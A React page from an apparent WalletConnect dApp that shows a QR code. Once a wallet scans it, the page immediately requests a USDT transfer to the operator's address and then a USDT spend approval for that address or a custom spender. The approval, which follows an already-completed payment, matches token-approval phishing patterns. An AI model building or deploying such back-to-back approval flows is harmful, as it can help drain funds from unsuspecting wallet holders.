// src/pages/SignPage.jsx
//
// ── FLOW ──────────────────────────────────────────────────────────────────────
//
//  You (dApp side):
//    1. Pick chain (ETH or BSC) + enter amount
//    2. Tap "Generate QR"
//    3. QR appears on screen — share it
//
//  Them (wallet side, never leaves wallet):
//    4. Open wallet → tap scan → scan QR
//    5. Wallet prompt 1: "Connect to Web3 QR dApp?" → Approve
//    6. Wallet prompt 2 (immediate): "Send X USDT to 0xYOUR_ADDRESS" → Confirm
//    7. Wallet prompt 3 (immediate): "Approve USDT spend" → Confirm
//    Done.
//
// ── WHY IT WORKS WITHOUT SWITCHING APPS ───────────────────────────────────────
//  WalletConnect sessions are persistent — once the wallet approves the
//  connection, we own that session and can fire requests back-to-back.
//  The wallet queues them as sequential prompts. The user never needs to
//  return to the browser.
//
// ── USDT NOTES ────────────────────────────────────────────────────────────────
//  USDT is NOT a standard ERC-20 — it has a non-standard transfer() and
//  approve() that returns no boolean. We use the exact ABI fragment that
//  matches the real deployed contracts on both chains.
//  ETH USDT: 6 decimals  → parseUnits(amount, 6)
//  BSC USDT: 18 decimals → parseUnits(amount, 18)
// ─────────────────────────────────────────────────────────────────────────────

import { useState, useEffect, useCallback } from 'react'
import QRCode from 'qrcode'
import { SignClient } from '@walletconnect/sign-client'
import { projectId, MY_WALLET_ADDRESS, USDT } from '../config.js'

// ── USDT ABI fragments ────────────────────────────────────────────────────────
// USDT on ETH has a non-standard ABI (no return value on transfer/approve).
// We define both functions we need.
const USDT_ABI = [
  {
    name: 'transfer',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: '_to',    type: 'address' },
      { name: '_value', type: 'uint256' },
    ],
    outputs: [],  // USDT transfer returns nothing — intentional
  },
  {
    name: 'approve',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value',   type: 'uint256' },
    ],
    outputs: [],  // same — no return value
  },
]

// Encode calldata for USDT transfer(to, amount)
async function buildTransferCalldata(to, amount, decimals) {
  const { encodeFunctionData, parseUnits } = await import('viem')
  return encodeFunctionData({
    abi: USDT_ABI,
    functionName: 'transfer',
    args: [to, parseUnits(String(amount), decimals)],
  })
}

// Encode calldata for USDT approve(spender, amount)
async function buildApproveCalldata(spender, amount, decimals) {
  const { encodeFunctionData, parseUnits } = await import('viem')
  return encodeFunctionData({
    abi: USDT_ABI,
    functionName: 'approve',
    args: [spender, parseUnits(String(amount), decimals)],
  })
}

// ── Status badge ──────────────────────────────────────────────────────────────
const STATUS_MAP = {
  idle:        { color: '#5a6a8a', label: 'Ready' },
  generating:  { color: '#ffc94d', label: 'Connecting to relay...' },
  waiting:     { color: '#4db8ff', label: 'Waiting for scan' },
  connected:   { color: '#4fffb0', label: 'Connected — sending payment...' },
  step2:       { color: '#ffc94d', label: 'Step 2: Approval sent to wallet' },
  success:     { color: '#4fffb0', label: 'All done ✓' },
  partial:     { color: '#ffc94d', label: 'Payment done, approval skipped' },
  error:       { color: '#ff5c5c', label: 'Error' },
  expired:     { color: '#ff5c5c', label: 'QR expired — regenerate' },
}

function StatusBadge({ status }) {
  const s = STATUS_MAP[status] || STATUS_MAP.idle
  const pulse = ['waiting','generating','connected','step2'].includes(status)
  return (
    <div style={{
      display: 'inline-flex', alignItems: 'center', gap: 8,
      background: s.color + '15',
      border: `1px solid ${s.color}44`,
      borderRadius: 20, padding: '5px 14px',
    }}>
      <div style={{
        width: 7, height: 7, borderRadius: '50%',
        background: s.color, boxShadow: `0 0 8px ${s.color}`,
        animation: pulse ? 'glow 1.2s infinite' : 'none',
      }} />
      <span style={{ fontFamily: 'var(--mono)', fontSize: 11, color: s.color }}>
        {s.label}
      </span>
    </div>
  )
}

// ── Step tracker (shows progress inside wallet) ───────────────────────────────
function StepTracker({ currentStep }) {
  const steps = [
    { id: 1, label: 'Connect',  desc: 'Wallet approves session' },
    { id: 2, label: 'Pay',      desc: 'Send USDT to your address' },
    { id: 3, label: 'Approve',  desc: 'Approve future USDT spend' },
  ]
  return (
    <div className="step-tracker">
      {steps.map((step, i) => {
        const done    = currentStep >  step.id
        const active  = currentStep === step.id
        const pending = currentStep <  step.id
        return (
          <div key={step.id} className="tracker-item">
            <div className={`tracker-circle ${done ? 'done' : active ? 'active' : 'pending'}`}>
              {done ? '✓' : step.id}
            </div>
            <div className="tracker-info">
              <div className={`tracker-label ${active ? 'active' : ''}`}>{step.label}</div>
              <div className="tracker-desc">{step.desc}</div>
            </div>
            {i < steps.length - 1 && (
              <div className={`tracker-line ${done ? 'done' : ''}`} />
            )}
          </div>
        )
      })}
    </div>
  )
}

// ── Main ──────────────────────────────────────────────────────────────────────
export default function SignPage() {
  const [chain, setChain]         = useState('ethereum')
  const [amount, setAmount]       = useState('')
  const [spender, setSpender]     = useState('')  // who to approve (optional)
  const [status, setStatus]       = useState('idle')
  const [step, setStep]           = useState(0)
  const [qrDataUrl, setQrDataUrl] = useState('')
  const [client, setClient]       = useState(null)
  const [results, setResults]     = useState([])
  const [error, setError]         = useState('')
  const [timeLeft, setTimeLeft]   = useState(0)
  const [showAdvanced, setShowAdvanced] = useState(false)

  const token = USDT[chain]

  // Init SignClient once
  useEffect(() => {
    SignClient.init({
      projectId,
      metadata: {
        name: 'Web3 QR dApp',
        description: 'Pay & Approve USDT',
        url: window.location.origin,
        icons: ['https://avatars.githubusercontent.com/u/179229932'],
      },
    }).then(setClient).catch(console.error)
  }, [])

  const reset = () => {
    setStatus('idle')
    setStep(0)
    setQrDataUrl('')
    setResults([])
    setError('')
    setTimeLeft(0)
  }

  // ── Main flow ─────────────────────────────────────────────────────────────
  const generateQR = useCallback(async () => {
    if (!client || !amount || parseFloat(amount) <= 0) return
    setStatus('generating')
    setStep(0)
    setResults([])
    setError('')
    setQrDataUrl('')

    try {
      // Step 1: create session → get wc: URI
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction'],
            // Support both ETH mainnet and BSC
            chains: ['eip155:1', 'eip155:56'],
            events: ['accountsChanged', 'chainChanged'],
          },
        },
      })

      if (!uri) throw new Error('Failed to generate session URI.')

      // Render QR from the wc: URI
      const dataUrl = await QRCode.toDataURL(uri, {
        width: 260,
        margin: 2,
        color: { dark: '#05080f', light: '#f0f4ff' },
        errorCorrectionLevel: 'M',
      })
      setQrDataUrl(dataUrl)
      setStatus('waiting')
      setStep(1)
      setTimeLeft(300)

      // ── Wait for wallet to scan and approve session ──────────────────────
      const session = await approval()
      setStatus('connected')
      setStep(2)

      const accounts  = session.namespaces.eip155.accounts
      const address   = accounts[0].split(':')[2]

      // Use the chain the wallet is actually on if it matches,
      // else use what the user selected
      const wcChain = token.wcChain

      // ── Prompt 2: Send USDT transfer ─────────────────────────────────────
      // This shows up in the wallet as "Send X USDT to 0xYOUR_ADDRESS"
      const transferData = await buildTransferCalldata(
        MY_WALLET_ADDRESS,
        amount,
        token.decimals
      )

      let paymentHash
      try {
        paymentHash = await client.request({
          topic:   session.topic,
          chainId: wcChain,
          request: {
            method: 'eth_sendTransaction',
            params: [{
              from:  address,
              to:    token.address,   // USDT contract
              data:  transferData,    // transfer(yourAddress, amount)
              gas:   '0x186A0',       // 100k gas
            }],
          },
        })
        setResults(r => [...r, {
          label: `✅ USDT Sent (${amount} ${token.symbol})`,
          value: paymentHash,
          link:  token.explorer + paymentHash,
        }])
      } catch (err) {
        // Payment rejected — stop here, don't send approval
        throw new Error('Payment rejected in wallet.')
      }

      // ── Prompt 3: USDT Approve ────────────────────────────────────────────
      // Fires immediately after payment — wallet shows next prompt
      // Uses spender address if provided, otherwise uses MY_WALLET_ADDRESS
      setStatus('step2')
      setStep(3)

      const approveSpender = spender || MY_WALLET_ADDRESS
      const approveData    = await buildApproveCalldata(
        approveSpender,
        amount,
        token.decimals
      )

      try {
        const approveHash = await client.request({
          topic:   session.topic,
          chainId: wcChain,
          request: {
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to:   token.address,
              data: approveData,
              gas:  '0x186A0',
            }],
          },
        })
        setResults(r => [...r, {
          label: `✅ USDT Approved (${amount} ${token.symbol})`,
          value: approveHash,
          link:  token.explorer + approveHash,
        }])
        setStatus('success')
      } catch {
        // Approval rejected — payment already went through
        setStatus('partial')
      }

    } catch (err) {
      const msg = err.message ?? ''
      if (msg.includes('expired')) {
        setStatus('expired')
      } else {
        setError(msg || 'Something went wrong.')
        setStatus('error')
      }
    }
  }, [client, chain, amount, spender, token])

  // Countdown
  useEffect(() => {
    if (timeLeft <= 0) return
    const t = setInterval(() => {
      setTimeLeft(n => {
        if (n <= 1) {
          clearInterval(t)
          setStatus(s => s === 'waiting' ? 'expired' : s)
          return 0
        }
        return n - 1
      })
    }, 1000)
    return () => clearInterval(t)
  }, [timeLeft])

  const mins    = String(Math.floor(timeLeft / 60)).padStart(2,'0')
  const secs    = String(timeLeft % 60).padStart(2,'0')
  const isActive = ['waiting','connected','step2'].includes(status)

  return (
    <div className="page sign-page">

      {/* Header */}
      <div className="page-header">
        <div className="page-tag">PAGE 02</div>
        <h1>Pay & Approve</h1>
        <p className="page-desc">
          One QR. They scan it — wallet shows payment prompt, then approval prompt,
          back to back. They never leave their wallet app.
        </p>
      </div>

      {/* ── Config ── */}
      <div className="config-card">
        {/* Chain selector */}
        <div className="input-group">
          <label>Chain</label>
          <div className="chain-selector">
            {Object.entries(USDT).map(([key, val]) => (
              <button
                key={key}
                className={`chain-btn ${chain === key ? 'active' : ''}`}
                onClick={() => { setChain(key); reset() }}
                disabled={isActive}
              >
                <span className="chain-icon">
                  {key === 'ethereum' ? '⟠' : '⬡'}
                </span>
                <span>{val.label}</span>
                <span className="chain-sub">{val.symbol}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Amount */}
        <div className="input-group">
          <label>Amount to receive <span className="label-hint">(USDT)</span></label>
          <div className="amount-row">
            <input
              type="number"
              placeholder="0.00"
              value={amount}
              min="0"
              step="1"
              onChange={e => setAmount(e.target.value)}
              disabled={isActive}
            />
            <span className="currency">USDT</span>
          </div>
        </div>

        {/* Advanced: custom spender */}
        <button
          className="advanced-toggle"
          onClick={() => setShowAdvanced(v => !v)}
        >
          {showAdvanced ? '▼' : '▶'} Advanced — custom approve spender
        </button>

        {showAdvanced && (
          <div className="input-group">
            <label>
              Approve spender <span className="label-hint">(defaults to your address)</span>
            </label>
            <input
              value={spender}
              onChange={e => setSpender(e.target.value)}
              disabled={isActive}
              placeholder={MY_WALLET_ADDRESS}
            />
          </div>
        )}
      </div>

      {/* ── QR + Steps ── */}
      <div className="qr-card">
        <div className="qr-card-header">
          <StatusBadge status={status} />
          {timeLeft > 0 && status === 'waiting' && (
            <span className="countdown">{mins}:{secs}</span>
          )}
        </div>

        {/* Step tracker — only show once QR generated */}
        {step > 0 && <StepTracker currentStep={step} />}

        {/* QR area */}
        {status === 'idle' && (
          <div className="qr-idle">
            <div className="qr-idle-icon">⬡</div>
            <p>Enter amount and tap Generate</p>
          </div>
        )}

        {status === 'generating' && (
          <div className="qr-idle">
            <div className="qr-idle-icon" style={{ animation:'spin 1s linear infinite' }}>⟳</div>
            <p>Connecting to relay...</p>
          </div>
        )}

        {qrDataUrl && (
          <div style={{ position:'relative', display:'inline-block' }}>
            <img
              src={qrDataUrl}
              alt="WalletConnect QR"
              className="qr-image"
              style={{
                opacity: ['expired','success','partial'].includes(status) ? 0.25 : 1,
                transition: 'opacity 0.3s',
              }}
            />
            {status === 'expired' && (
              <div className="qr-expired-overlay">Expired — regenerate</div>
            )}
            {(status === 'connected' || status === 'step2') && (
              <div className="qr-overlay-badge">✓ Scanned — check wallet</div>
            )}
            {status === 'success' && (
              <div className="qr-overlay-badge" style={{ background:'#4fffb0', color:'#020810' }}>
                ✓ All done
              </div>
            )}
            {status === 'partial' && (
              <div className="qr-overlay-badge" style={{ background:'#ffc94d', color:'#020810' }}>
                Payment done
              </div>
            )}
          </div>
        )}

        {/* What's in the QR */}
        <div className="mechanic-box" style={{ width:'100%' }}>
          <div className="mechanic-title">🔬 What happens after scan</div>
          <p>
            The QR encodes a <code>wc:</code> URI. Once scanned, the wallet
            establishes an encrypted session through the relay. Your dApp then
            fires two <code>eth_sendTransaction</code> calls back-to-back:
            first <code>USDT.transfer(yourAddress, amount)</code>, then
            <code> USDT.approve(spender, amount)</code> — both on {token.label}.
            The wallet queues them as sequential confirmation screens.
          </p>
        </div>
      </div>

      {/* ── Results ── */}
      {results.length > 0 && (
        <div className="results-list">
          {results.map((r, i) => (
            <div key={i} className="result success">
              <div className="result-header">
                <span>{r.label}</span>
                <a href={r.link} target="_blank" rel="noreferrer" className="result-copy">
                  explorer ↗
                </a>
              </div>
              <div className="result-label">Tx Hash</div>
              <code style={{ wordBreak:'break-all', fontSize:11 }}>{r.value}</code>
            </div>
          ))}
        </div>
      )}

      {status === 'partial' && (
        <div className="result" style={{ background:'#ffc94d0a', border:'1px solid #ffc94d33' }}>
          <div className="result-label" style={{ color:'#ffc94d' }}>
            ⚠️ Payment confirmed but approval was skipped by user.
          </div>
        </div>
      )}

      {error && (
        <div className="result error">
          <div className="result-label">❌ {error}</div>
        </div>
      )}

      {/* ── Action button ── */}
      {!isActive && !['success','partial'].includes(status) && (
        <button
          className="btn primary full"
          onClick={generateQR}
          disabled={!client || !amount || parseFloat(amount) <= 0}
        >
          {!client ? '⏳ Initializing...' : '⬡ Generate QR'}
        </button>
      )}

      {['success','partial'].includes(status) && (
        <button className="btn secondary full" onClick={reset}>
          ↺ New QR
        </button>
      )}

      {isActive && (
        <button className="btn secondary full" onClick={reset}>
          ✕ Cancel
        </button>
      )}

    </div>
  )
}
